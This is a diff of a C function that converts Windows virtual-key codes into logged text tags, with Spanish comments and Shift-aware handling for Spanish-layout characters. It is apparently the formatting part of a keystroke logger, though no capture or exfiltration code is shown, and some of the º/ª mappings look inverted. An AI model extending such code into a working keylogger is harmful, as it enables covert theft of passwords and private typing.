@@ -6,10 +6,10 @@ const char* VkCodeToString(DWORD vkCode) {
     switch (vkCode) {
         case VK_BACK: return "[BACKSPACE]";
         case VK_TAB: return "[TAB]";
-        case VK_RETURN: return "[ENTER]\n";
-        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: return "[SHIFT]";
-        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return "[CTRL]";
-        case VK_MENU: case VK_LMENU: case VK_RMENU: return "[ALT]";
+        case VK_RETURN: return "[\\n]\n";
+        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: return "";
+        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return "";
+        case VK_MENU: case VK_LMENU: case VK_RMENU: return "";
         case VK_CAPITAL: return "[CAPSLOCK]";
         case VK_ESCAPE: return "[ESC]";
         case VK_SPACE: return "[SPACE]";
@@ -23,6 +23,7 @@ const char* VkCodeToString(DWORD vkCode) {
         case VK_PRIOR: return "[PAGEUP]";
         case VK_NEXT: return "[PAGEDOWN]";
         case VK_INSERT: return "[INSERT]";
+        case VK_LWIN: case VK_RWIN: return "[WIN]";
         case VK_F1: return "[F1]";
         case VK_F2: return "[F2]";
         case VK_F3: return "[F3]";
@@ -36,18 +37,27 @@ const char* VkCodeToString(DWORD vkCode) {
         case VK_F11: return "[F11]";
         case VK_F12: return "[F12]";
         // Teclas especiales del teclado español (UTF-8)
-        case 186: return "ñ";           // VK_OEM_1 en layout español (ñ)  
-        case 187: return "+";           // VK_OEM_PLUS
-        case 188: return ",";           // VK_OEM_COMMA
-        case 189: return "-";           // VK_OEM_MINUS
-        case 190: return ".";           // VK_OEM_PERIOD
-        case 191: return "ç";           // VK_OEM_2 en layout español
-        case 192: return "º";           // VK_OEM_3 en layout español (º/ª)
-        case 219: return "'";           // VK_OEM_4 en layout español
-        case 220: return "¿";           // VK_OEM_5 en layout español
-        case 221: return "¡";           // VK_OEM_6 en layout español
-        case 222: return "´";           // VK_OEM_7 en layout español
-        case 226: return "<";           // VK_OEM_102 en layout español
+        /* case 186: {
+            int shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+            return shiftPressed ? "º" : "ª";
+        } */
+        //case 187: return "+";           // VK_OEM_PLUS
+        //case 188: return ",";           // VK_OEM_COMMA
+        //case 189: return "-";           // VK_OEM_MINUS
+        //case 190: return ".";           // VK_OEM_PERIOD
+        //case 191: return "ç";           // VK_OEM_2 en layout español
+        case 192: { // VK_OEM_1 en layout español (ñ/Ñ)
+            int shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+            return shiftPressed ? "Ñ" : "ñ";
+        }
+        //case 219: return "'";           // VK_OEM_4 en layout español
+        case 220: {
+            int shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+            return shiftPressed ? "º" : "ª";
+        }
+        //case 221: return "¡";           // VK_OEM_6 en layout español
+        //case 222: return "´";           // VK_OEM_7 en layout español
+        //case 226: return "<";           // VK_OEM_102 en layout español
         default: {
             static char buf[16];
             // Letras A-Z
